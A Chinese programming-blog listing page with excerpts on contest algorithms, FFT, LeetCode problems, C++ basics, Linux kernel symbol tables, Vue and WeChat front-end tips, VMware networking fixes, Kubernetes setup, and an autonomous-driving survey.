	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a02da62101f7b0b9828e465f10760ba0/" rel="bookmark">
			第八届蓝桥杯第九题--分巧克力（C语言）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第八届蓝桥杯第九题–分巧克力（C语言） 一.比赛题目 1.题目要求 儿童节那天有K位小朋友到小明家做客。小明拿出了珍藏的巧克力招待小朋友们。小明一共有N块巧克力，其中第i块是Hi x Wi的方格组成的长方形。为了公平起见，小明需要从这 N 块巧克力中切出K块巧克力分给小朋友们。切出的巧克力需要满足：
形状是正方形，边长是整数大小相同
例如一块6x5的巧克力可以切出6块2x2的巧克力或者2块3x3的巧克力。当然小朋友们都希望得到的巧克力尽可能大，你能帮小Hi计算出最大的边长是多少么？ 2.输入与输出 输入：
第一行输入包含两个整数N和K。(1 &lt;= N, K &lt;= 100000)
以下N行每行包含两个整数Hi和Wi。(1 &lt;= Hi, Wi &lt;= 100000)
输入保证每位小朋友至少能获得一块1x1的巧克力。
输出：
输出切出的正方形巧克力最大可能的边长。
样例输入：
2 10
6 5
5 6
样例输出：
2
二.分析过程 1.整体分析 (1)首先我个人认为这道题里面最重要的就是认识到如何来切
题目中要求是第i块是hi*wi，且切割出来的是正方形，边长是整数，在这种情况下，我们可以来进行判断，把每块巧克力的边长都拿来除以j（j暂时未知，是能够切出来的正方形巧克力的边长），然后在把每块巧克力能切出来的个数相加，大于或者等于k（k位小朋友），我们就说k是满足条件的。
代码如下：
int fun(int j) { int sum=0; for(int i=0;i&lt;=n;i++) { sum+=(hi[i]/j)*(wi[i]/j); if(sum&gt;=k) return true;	//满足条件返回true； } return false; //不满足条件返回false； } （2）然后找出j的值最大是多少
j的最大值有很多种查找方法，但是因为数据限定是1–100000，所以如果用顺序查找，是写个for循环依次从100000递减到1来查找最大值的话，会超时；所以在有序且是顺序存储结构的情况下采用了折半查找（也就是二分查找）。
代码如下：
int l=1,r=100001,mid; while(l&lt;=r) { mid=(l+r)/2; if(fun(mid)) l=mid+1; else r=mid-1;	} 三.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a02da62101f7b0b9828e465f10760ba0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81217ec0d9e190216d11e88fa0f7b76c/" rel="bookmark">
			傅里叶变换 一维快速傅里叶变换（快速的一维离散傅里叶变换、分治法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://blog.csdn.net/qq_36511401/article/details/102969124
一、介绍
1、一维离散傅里叶变换DFT。
DFT:(Discrete Fourier Transform)离散傅里叶变换是傅里叶变换在时域和频域上都呈离散的形式，将信号的时域采样变换为其DTFT的频域采样。在形式上，变换两端（时域和频域上）的序列是有限长的，而实际上这两组序列都应当被认为是离散周期信号的主值序列。即使对有限长的离散信号作DFT，也应当将其看作其周期延拓的变换。
根据欧拉公式，其中，i为虚数单位，即。
公式：，可看作：。
2、一维逆离散傅里叶变换IDFT。
公式：，可看作：
3、一维快速傅里叶变换FFT。
1)FFT（Fast Fourier Transformation）是离散傅氏变换（DFT）的快速算法，即利用计算机计算离散傅里叶变换（DFT)的高效、快速计算方法的统称。快速傅里叶变换是1965年由J.W.库利和T.W.图基提出的。采用这种算法能使计算机计算离散傅里叶变换所需要的乘法次数大为减少，特别是被变换的抽样点数N越多，FFT算法计算量的节省就越显著。即为快速傅氏变换。它是根据离散傅氏变换的奇、偶、虚、实等特性，对离散傅立叶变换的算法进行改进获得的。
2)因为根据欧拉公式和一维离散傅里叶公式，可以将欧拉公式中的看作是，而且可以是要将其代入到cos和sin函数中，所以其实可以看作是一个半径为1的圆。而可以看作将圆分成N份，即上面那个矩阵中的，而第k份的那个点就是那个值。
3)可以推导出关系。
周期性： , 原点对称：
4）要让DFT的长度等于2的n次幂，其中n是正整数。
令 ， ，
则。
但是这里的k是小于的，但是可以推导出
， 其中。
最后将G(x)，P(x)按照这个方式，用分治法不停的拆分出来，剩下最后俩个 ，然后返回计算的结果。
4、一维逆快速傅里叶变换IFFT。
比较DFT和IDFT公式，会发现逆变换和正变换的区别在于：
1、中的正负的区别。
2、逆变换在结束之后，每个值都要除以原数组的大小。
所以我们只要套用FFT的算法就可以了，将F(k)作为输入数组，输出f(x)作为输出数组，将因子改为,最后将f(x)全部除以N就可以了。
二、主要代码
1、复数类。
package com.zxj.reptile.utils.number;
public class Complex {
private double real;//实数
private double image;//虚数
public Complex() {
real = 0;
image = 0;
}
public Complex(double real, double image) {
this.real = real;
this.image = image;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81217ec0d9e190216d11e88fa0f7b76c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b8384767063757293099b02dd72e6b4/" rel="bookmark">
			西安邮电大学高级程序设计复试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		复试同学需要资料的可以查看一下连接：
西安邮电大学高级程序设计复试资料
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59ffdb4c682018d7fdaf85f8f45b3c1a/" rel="bookmark">
			西安邮电大学-考研-电路分析复试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		复试同学需要资料的可以查看一下连接
https://download.csdn.net/download/x_uhen/12098057
西安邮电大学电路分析复试资料
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c480dcfb3be99652f56daa01297b3d4d/" rel="bookmark">
			西安邮电大学数字信号处理考研复试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		复试同学需要资料的可以查看一下连接
https://download.csdn.net/download/x_uhen/12098072
西安邮电大学数字信号处理考研复试资料
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44b2fd2c3ed08c67f7997b800d79592b/" rel="bookmark">
			Gym - 102361A Angle Beats(几何)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目链接：点击查看
题目大意：给出n个点，再给出m个询问，每次询问给出一个点 x，我们需要回答包括点 x 的直角三角形有多少个
题目分析：题目比较直接，数据也比较小，支持n*n的算法处理，首先我们必须知道，如果要包括点 x 所组成三角形，那么点 x 可以在直角点上，也可以在非直角点上，比较容易想到的方法是离线处理，我们需要分类讨论，也就是上述两个情况，对于每个询问而言，以点 x 为相对原点，对其余n个点进行极角排序，然后用双指针保证时间复杂度为O(n)，一个指针固定住一条直角边，另一个指针去找另一条直角边上有多少个点，这样时间复杂度是O(n*m)，解决了点 x 在直角点上的答案，剩下非直角点上的答案我们可以O(n)枚举直角点，同上利用双指针计算贡献，对于有贡献的点 x 累加答案即可，时间复杂度为大概就是n*m*logn的样子，不过实现起来比较麻烦，不想多说
还有一种方法比较简单，但是不太好想，还比较考察代码功底，就是围绕着map展开，首先我们要找直角三角形，本质上是要找垂直的两条边，换句话说就是需要找两个向量垂直，将点抽象成向量就简单多了，和上面大同小异，当点 x 为直角点时，我们记录下点 x 与 n 个点的向量，最后跑一遍map统计答案即可，当点 x 为非直角点时，一样O(n)枚举直角点，O(n)枚举另一个非直角点，然后直接统计答案就好了，实现起来比较简单，不过难点不是main函数里，而是在Point结构体内对小于号的重载，因为我们需要的是向量，也就是说需要一个带斜率的直线，为了方便起见，我们在重载小于号时应该试图将其归类，譬如(2,1)和(4,2)虽然数值不一样，但是代表的都是同一个向量，我们应该将其归为一类而不是两类，第一次知道map竟然可以根据小于号将载入的数据重新分类，有了这样一个方便的性质，在重载好小于号后就可以直接实现main函数里的内容了，比较简单，具体实现看代码
代码：
#include&lt;iostream&gt; #include&lt;cstdio&gt; #include&lt;string&gt; #include&lt;ctime&gt; #include&lt;cmath&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;stack&gt; #include&lt;queue&gt; #include&lt;map&gt; #include&lt;set&gt; #include&lt;sstream&gt; using namespace std; typedef long long LL; const int inf=0x3f3f3f3f; const int N=2e3+100; struct Point{ LL x,y; Point(){} Point(int _x,int _y){ x = _x; y = _y; } void input(){ scanf("%lld%lld",&amp;x,&amp;y); } Point change()const//将所有的向量都转换为非负数 { if(x&lt;0||x==0&amp;&amp;y&lt;0) return Point(-x,-y); return *this; } bool operator &lt; (const Point &amp;b)const{ Point t1=change(),t2=b.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44b2fd2c3ed08c67f7997b800d79592b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7bd2f54a61bcea08e6df680478c0e56/" rel="bookmark">
			C&#43;&#43;第4课：布尔类型&#43;三目运算&#43;引用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文学习自 狄泰软件学院 唐佐林老师的 C++课程
实验1 ：bool 类型使用注意1
实验2 ：bool 类型使用注意2
实验3：C 中 三目运算符不可作为左值使用
实验4 ：C++ 中 三目运算符可作为左值使用
实验5 ：C++中 三目运算符可能返回的值中，有一个是常量值，不能作为左值使用
实验6 ：引用的使用
实验7 ：引用的使用- 用同类型变量初始化
实验8 ：引用的使用- 定义引用时必须要初始化
实验9 ：引用的使用- 不能用字面常量初始化引用
打印：
0
1
1
实验1 ：bool 类型使用注意1
#include &lt;stdio.h&gt; int main(int argc, char *argv[]) { bool b = 0; printf("b = %d\n", b); b++; printf("b = %d\n", b); b = b-3; printf("b = %d\n", b); return 0; } 实验2 ：bool 类型使用注意2
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7bd2f54a61bcea08e6df680478c0e56/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b48c3ae97bb5bb6c1b235b6c57c23bf/" rel="bookmark">
			商城类项目实战涉及到的一些知识点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、基础服务搭建 1.1、Maven私服搭建 https://blog.csdn.net/RuiKe1400360107/article/details/104083954
1.2、GitLab仓库管理搭建 https://blog.csdn.net/RuiKe1400360107/article/details/104091977
1.3、Apollo配置中心搭建 https://blog.csdn.net/RuiKe1400360107/article/details/104098359
1.4、唯一登录 https://blog.csdn.net/RuiKe1400360107/article/details/104142939
1.5、SSO单点登录 https://blog.csdn.net/RuiKe1400360107/article/details/104165639
1.6、ES与MySQL数据库同步 https://blog.csdn.net/RuiKe1400360107/article/details/104270421
1.7、支付服务搭建 https://blog.csdn.net/RuiKe1400360107/article/details/104335018
https://blog.csdn.net/RuiKe1400360107/article/details/104341744
https://blog.csdn.net/RuiKe1400360107/article/details/104413066
二、架构图 .....待更新
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc8a6d8fbb2da7d3948b5e38a6a9a947/" rel="bookmark">
			CONFIG_KALLSYMS_ALL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内核配置 在2.6内核中，为了更好地调试内核，引入了kallsyms。kallsyms抽取了内核用到的所有函数地址(全局的、静态的)和非栈数据变量地址，生成一个数据块，作为只读数据链接进kernel image，相当于内核中存了一个System.map。
CONFIG_KALLSYMS=y 符号表中包含所有的函数
CONFIG_KALLSYMS_ALL=y 符号表中包括所有的变量(包括没有用EXPORT_SYMBOL导出的变量)
CONFIG_KALLSYMS_EXTRA_PASS=y
make menuconfig General setup ---&gt; [*] Configure standard kernel features (for small systems) ---&gt; （选中此项，才有/proc/kallsyms接口文件, oops问题，选中此选项即可，子选项可以忽略） [*] Load all symbols for debugging/ksymoops [*] Include all symbols in kallsyms [*] Do an extra kallsyms pass 这样当系统出现oops的时候打印的信息就不是数字了，而是对应的符号信息。
Call Trace:
[] sys_delete_module+0x191/0x1ce
[] do_page_fault+0x189/0x51d
[] syscall_call+0x7/0xb
System.map与kallsyms ./scripts/kallsyms.c生成System.map
./scripts/kallsyms.c解析vmlinux(.tmp_vmlinux)生成kallsyms.S(.tmp_kallsyms.S)，然后内核编译过程中将kallsyms.S(内核符号表)编入内核镜像uImage
内核启动后，kernel/kallsyms.c解析uImage形成/proc/kallsyms
/proc/kallsyms cat /proc/kallsyms
000000000000a018 D per_cpu__xen_vcpu
000000000000a020 D per_cpu__xen_vcpu_info
000000000000a060 d per_cpu__mc_buffer
000000000000b570 D per_cpu__xen_mc_irq_flags
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc8a6d8fbb2da7d3948b5e38a6a9a947/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74669351f89b8d5f42049950ca2125a4/" rel="bookmark">
			DMA(四) - DMA_API_DEBUG
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DMA_API_DEBUG
为了debug驱动程序及发现使用DMA-API时的bug，检测代码可以编译到kernel中，它们可以告诉开发 者那些违规行为。如果你的体系结构支持，你可以选择编译选项“Enable debugging of DMA-API usage”，使能这个选项会影响系统性能，所以请勿在产品内核中加入该选项。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93ee67d33ea0d6a2710fdbe71ed47bea/" rel="bookmark">
			[LeetCode 21,26,27][简单]合并两个有序链表/删除排序数组中的重复项/移除元素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		21.合并两个有序链表 题目链接
直接比过去，把原来的链表拼起来，当然也可以拿值new过去。
/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */ class Solution { public: ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) { ListNode *ans = new ListNode(0); ListNode *head = ans; while(l1!=NULL&amp;&amp;l2!=NULL){ if(l1-&gt;val&lt;l2-&gt;val){ans-&gt;next = l1;l1 = l1-&gt;next;} else {ans-&gt;next = l2;l2 = l2-&gt;next;} ans = ans-&gt;next; } if(l1!=NULL)ans-&gt;next = l1; if(l2!=NULL)ans-&gt;next = l2; return head-&gt;next; } }; //把上面的ans-&gt;next = l1替换为ans-&gt;next = new ListNode(l1-&gt;val)也可以(l1,l2都要换) 好久都没有写过带指针的东西了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/93ee67d33ea0d6a2710fdbe71ed47bea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f572625067fb8bf706f119ef493cdac4/" rel="bookmark">
			这几个相见恨晚的顶级资源网站，不知道实在是太可惜了！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二维码生成与制作 www.wwei.cn 菜鸟教程，程序员必备www.runoob.com 办公资源 www.bangongziyuan.com 视频网站 www.bilibili.com 持续更新…
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/495f9f9bf2a0376a3bd79e78590a2223/" rel="bookmark">
			（前端学习）寒假第一周周报
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		了解了一下前端学习的路线，我有点震惊，学习的东西真的很多很多，如下:
原来css也只是准备工作，不禁感慨任重而道远
附带一张我HTML和css的视频学习进度
这周学习完了HTML和css中的属性和一部分选择器
HTML—给网页的内容添加语义，而不是改变样式 1.首先了解了五大浏览器
浏览器IEFirefox火狐chrome谷歌opera欧朋safarimac自带 ps:我的认知水平仅限于知道它们的名字（惭愧）
2. 字符集:字符集合，将字符排序并标上序号
字符编码:规定标上序号的字符储存的方式
字符编码储存内容ASCII只储存了英文字母及字符GB2312储存了简体中文字符GBK储存了简体和繁体中文字符UNICODE分为UCS和UTF，其中UTF包括UTF-8，UTF-16，UTF-32 3.网页编写代码的格式:
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 4.基础标签
标签作用H系列标签h1~h6 ，给文本定义标题p标签定义段落Hr标签显示分割线img标签插入图片a标签超链接，控制页面之间的跳转base标签统一超链接如何打开br标签定义换行title标签定义网站的标题注释&lt; !- -内容- -&gt;或者/**/锚点例如点击头部跳转到中部或者尾部假链接点击之后不会跳转 练习：
5.列表
有序列表（ordered list) &lt;ol&gt; &lt;li&gt;需要显示的内容&lt;/li&gt; &lt;/ol&gt; 无序列表(unordered list)（前面会有小圆点）
例如新闻列表
&lt;ul&gt; &lt;li&gt;需要显示的内容&lt;/li&gt; &lt;/ul&gt; eg:
效果图
定义列表 例如京东网站尾部的信息
eg：
&lt;dl&gt; &lt;dt&gt;&lt;/dt&gt;//定义列表中的标题 &lt;dd&gt;&lt;/dd&gt;//定义标题下的内容 &lt;/dl&gt; 6.表格标签
格式: &lt;table&gt; &lt;tr&gt;//行 &lt;td&gt;显示的内容&lt;/td&gt;//小格 &lt;/tr&gt; &lt;/table&gt; 细线表格 &lt;table bgcolor="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/495f9f9bf2a0376a3bd79e78590a2223/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06ba851e31dd6e1d3ff37b1cab45ba68/" rel="bookmark">
			vue 引入原生高德地图API
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步 在index.html中引入
第二步在根目录下创建 vue.config.js 文件
module.exports = { configureWebpack: { externals: { 'AMap': 'AMap', 'AMapUI': 'AMapUI' } } }; &lt;template&gt; &lt;div class="home"&gt; &lt;div id="container" style="width:100%;height:600px"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: "Home", data() { return { map: null, //地图w infowindowL: null, //信息窗体 list: [ //数据j { lng: 121.5273285, lat: 31.25515044, url: "../assets/img/student.png", title: "测试啊", name: "李逍遥", tel: "13762155556", id: "1", path: [ [121.5389385, 31.21515044], [121.5389385, 31.29615044], [121.5273285, 31.21515044], [121.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06ba851e31dd6e1d3ff37b1cab45ba68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7437dd79fdbebf13af4f9afcfc0d70bc/" rel="bookmark">
			nuxt vue中刷新vuex state 数据丢失解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		nuxt 1 配置插件（），太简单就不说了。
注意：要禁止服务端运行，不然会报错，这个事件是在客户端添加的，不是在服务端小渲染的时候添加的。
2 写代码，如下。
export default function(ctx){ // 离开页面 window.addEventListener('beforeunload', ()=&gt; { console.log('触发离开事件') sessionStorage.setItem("store",JSON.stringify(ctx.store.state)) }); // 页面加载完成 window.addEventListener('load', ()=&gt; { console.log('触发加载完成事件') let storeCache = sessionStorage.getItem("store") if(storeCache != null&amp;&amp;storeCache != undefined&amp;&amp; storeCache!= ''){ // 普通的state属性高更改的话需要用mutations ，但是如果你修改的是state 根属性的时候，那么 // 就要使用replaceState 方法了。 ctx.store.replaceState(JSON.parse(storeCache)); } }); } vue vue 就更简单了，直接在main.js
的入口文件添加代码就可以了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7ff28e36b48df56624ddb263fa4ddbd/" rel="bookmark">
			微信公众号VUE项目获取code
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在微信公众号的项目中难免会用到支付，用到支付后就必须前端拿到code后去换区openid，在微信公众号中获取授权的有两种方式，一种是静默授权，一种是非静默的授权，具体移步微信公众号开发文档
let origin = location.href; let urlNow =encodeURIComponent(origin);///netbar/api/wechat/v1/get_open_id let scope = 'snsapi_base'; //snsapi_userinfo //静默授权 用户无感知 let appid = '你的appid'; let url = `https://open.weixin.qq.com/connect/oauth2/authorize?appid=${appid}&amp;redirect_uri=${urlNow}&amp;response_type=code&amp;scope=${scope}&amp;state=${state}#wechat_redirect` 微信公众号是通过微信的链接重定向来获取code，我们拿到code需要将code从地址上截取出来，下面是截取的方法
function getUrlKey(name) {//获取url 参数 // alert("location.href code = "+"====="+location.href); return decodeURIComponent((new RegExp('[?|&amp;]' + name + '=' + '([^&amp;;]+?)(&amp;|#|;|$)').exec(location.href) || [, ""])[1].replace(/\+/g, '%20')) || null; } 拿到code后我们把cide传给后台就行，还有在微信工号的后台配置js安全域名和网页授权域名，要不会提示redirect_uri和配置的域名不一致
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bd00c46e064fef750e9f90ef7e3b7cc/" rel="bookmark">
			VMware已安装，出现没有虚拟网络适配器，windows不能访问虚拟机ip问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		遇到错误：安装VMware Workstation Pro这个软件，网络适配器中没有虚拟网卡，导致无法上网
解决方法：遇到这个问题，我就第一时间就去网上搜索解决方法，方案有很多，但是试了很多个还是不行，直到看到一个解决方案，便去试了试，最后还是解决了。这里，
打算把我解决这个问题的方法记录下来，以便日后再次使用
分析出现该问题的原因：如果你是第一个安装的话，出现这种情况很少，大多数出现这种情况的原因是：你之前也按照过后，但是你卸载的时候可能方法不对，导致VMware
Workstation Pro这软件没有完全删除干净。所以我的方案就是先把之前的删除干净之后，再进行安装。但是可能还有其他的原因导致安装后，
没有网络适配器，你跟着我的步骤，应该可以解决。
1、如果已经安装好了的话,请先卸载掉(也可以不卸载),我是卸载掉的。
2、打开服务
3、找到下面这两个服务，设置成自动，最初始是手动的(下面这个是我之前已经设置好了的)
4、如果你已经安装了VMware的话，那么将VMware开头的改为禁用，如果VMware已经卸载的话，也看看有没有这个服务，有的话，也改为禁用吧（下面截图是我已经安装好了，只参考服务名，记住是VMware开头的）
5、上面的步骤做好了之后呢，下载工具包，然后解压。
链接: https://pan.baidu.com/s/10oiUKdy2TdwsGgKd8KDMPQ 提取码: ssge
（出现要注册购买的界面直接关闭就会打开此软件进行操作）
6、解压之后，打开CCleaner.exe文件，并点击到下面这个选项，点击扫描注册，并且修复选定问题
7、修复完毕之后呢，如果你之前安装过了，打开VMware这个软件，打开虚拟网络编辑器，这个虚拟网络编辑器在编辑选项下面，看到下面这个页面了，点击还原默认设置(在这之前先点击更改设置)，这样就可以解决了。如果你之前没有安装VMware的话，那就先安装吧，安装过后应该就会有虚拟网络适配器了。没有的话，再还原默认设置
可以通过搜索Workstation Pro找到虚拟网络编辑器
恢复默认之前必须关闭虚拟机。
8、再去网络连接那里，看看适配器，就会出现下面这个图
操作成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b292a5a5c491135e3ccc9b2466fc3b1a/" rel="bookmark">
			CentOS7.4环境下的K8S搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、k8s简介... 1
2、基础架构图... 1
2.1、master. 1
2.2、apiserver. 2
2.3、scheduler kubernetes. 2
2.4、Replication Controllers. 2
2.5、minion. 2
2.6、container. 2
2.7、 Pod. 3
2.8、Kube_proxy. 3
2.9、Etcd. 3
2.10、Services. 4
2.11、Labels 标签... 4
2.12、 Deployment. 4
2.13、Kubelet命令... 4
2.14、总结... 5
2.14.1、Kubernetes的架构... 5
2.14.2、Replication controller. 5
2.14.3、service. 5
2.14.4、Kubernetes. 5
2.14.5、pod. 5
3、环境规划... 5
4、环境准备... 6
4.1、配置k8s的yum源(master) 6
4.2、配置yum源（node1和node2）... 9
4.3、主机名规划... 10
4.4、配置/etc/hosts. 10
4.5、配置时间同步... 11
4.5.1、配置chrony服务端（master）... 11
4.5.2、配置chrony客户端（两个node节点都做）... 14
4.6、关闭防火墙... 15
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b292a5a5c491135e3ccc9b2466fc3b1a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f34a11d6400ef6b27a36ad8ca0a432fd/" rel="bookmark">
			LeetCode 图解 | 21.合并两个有序链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方蓝字设为星标
下面开始今天的学习～
今天分享的题目来源于 LeetCode 上第 21 号问题：合并两个有序链表。
题目描述 将两个有序链表合并为一个新的有序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 示例：
输入：1-&gt;3-&gt;4, 2-&gt;5-&gt;6 输出：1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6 题目解析 首先，设定一个虚拟节点 dummy 用来存储结果，循环对比 L1 和 L2 节点上的数字，通过调整 p节点的 next 指针来调整 dummy 的结果。
如果 L1 当前位置的值小于等于 L2 ，我们就把 L1 的值接在 dummy 节点的后面同时将 L1 指针往后移一个
如果 L2 当前位置的值小于 L2 ，我们就把 L2 的值接在 p 节点的后面同时将 L2 指针往后移一个
不管我们将哪一个元素接在了 p 节点后面，都需要向后移一个元素
重复以上过程，直到 L1 或者 L2 指向了 null 在循环终止的时候， L1 和 L2 至多有一个是非空的。由于输入的两个链表都是有序的，所以不管哪个链表是非空的，它包含的所有元素都比前面已经合并链表中的所有元素都要大。这意味着我们只需要简单地将非空链表接在合并链表的后面，并返回合并链表。
动画理解 代码实现 /** * Definition for singly-linked list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f34a11d6400ef6b27a36ad8ca0a432fd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70edf600b96d936777642f95315e7120/" rel="bookmark">
			centos7 安装net-tools
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 yum install -y net-tools 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dae1893c000e500a2774e101d3f6e51a/" rel="bookmark">
			两万字自动驾驶技术综述，你想知道的这里都有
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 摘要引言前景与挑战系统构成和框架系统框架传感器和硬件 定位与建图GPS-IMU融合SLAM基于先验地图定位 感知检测基于图像的目标检测语义分割三维目标检测 目标跟踪道路和车道线检测 评估（ ASSESSMENT）总体风险和不确定性评估周围驾驶行为评估驾驶风格识别 规划与决策全局规划局部规划 人机交互数据集和开源工具数据集和标准开源框架和模拟器 总结参考文献 本文主要翻译自[A Survey of Autonomous Driving: Common Practices and Emerging Technologies]，结合我自己的理解做了一些精简和删改，希望能对大家有一些帮助，这篇文章很新很全，有时间的朋友建议一读。 摘要 本文主要讨论ADS（Autonomous Driving System）的主要问题以及相关技术层面的综述，包括以下几个方面，当前挑战，系统架构，新兴方法，核心功能（定位，建图，感知，规划，人机交互）等。文章最后介绍了相关可供测试开发的开源框架及仿真器。
引言 主要介绍了一些背景，提到了两个著名的自动驾驶研究项目
Eureka Project PROMETHEUS1：1987-1995年间在欧洲开展，是最早的主要自动化驾驶研究之一，戴姆勒-奔驰公司的VITA II也基于此而来。DARPA Grand Challenge2：美国国防部主办的业内最负盛名的挑战赛，许多经典的文章都来自于这里。 在传统的自动驾驶方案系统架构中，一般将任务划分为多个模块，并在各个模块上使用一系列传感器和算法。但是随着深度学习3的发展，逐渐出现了一些端到端的系统。ADS高级系统架构分类如下，主要是按连通性和算法实现逻辑划分，具体介绍在后面
前景与挑战 前景就不提了，自动驾驶不缺故事。
按照美国汽车工程师学会（SAE）的定义，汽车的自动化水平如下
L0：无自动化L1：原始驾驶员辅助系统（Primitive driver assistance systems），包括自适应巡航控制、防抱死制动等L2：部分自动化，先进的辅助系统（Advanced assistance systems），例如紧急制动或避免碰撞L3：有条件的全自动化（Conditional automation），在正常操作期间，驾驶员可以专注于除驾驶以外的其他任务，但是紧急情况下必须能快速响应并接管车辆L4：在天气条件许可，基础设施（信号地图等）完善的情况下，完全不需要驾驶员。L5：无论在任何场景下，都不需要驾驶员 目前尚无完全实现L4级别及以上的自动驾驶车辆。
系统构成和框架 系统框架 像引言中显示的那样，一般从系统框架上可以分为单车辆系统（Ego-only systems）和互联车辆系统（Connected multi-agent systems）；从算法实现上，可以分为两大类，一类是通过将各个部分模块化来实现，另一类是直接通过端到端的实现。
单车辆系统，顾名思义就是始终在一辆车自身执行所有必要的自动驾驶操作，而互联车辆系统可能需要依赖于其他车辆和一些基础设施来完成一些操作，比如现在比较火热的车辆网，V2X等。就目前来说，当然还是单车辆系统更为常见。
模块化系统（Modular systems），指将传感器输入到执行器输出的中间过程分别构造成一个个独立的模块，比如定位、建图、感知、评估、规划与决策、车辆控制、预测、人机交互等。模块化的基本逻辑就是分而治之，把一个复杂的任务分成若干个较为简单的子任务。除此之外，模块化还有一些隐藏的优势，比如说对一些约束（如紧急制动，超速等），多模块意味着可以从不同角度施加约束，可以保证在其中部分传感器出现偏差的时候仍能提供较为可靠的输出。反过来说，多模块也意外着出错的概率大大增加，某个模块的错误可能会沿着进程传播扩散，如前段时间的特斯拉事故，感知模块误将白色拖车分类为天空，即使后续模块完全正确执行，错误也无法避免。
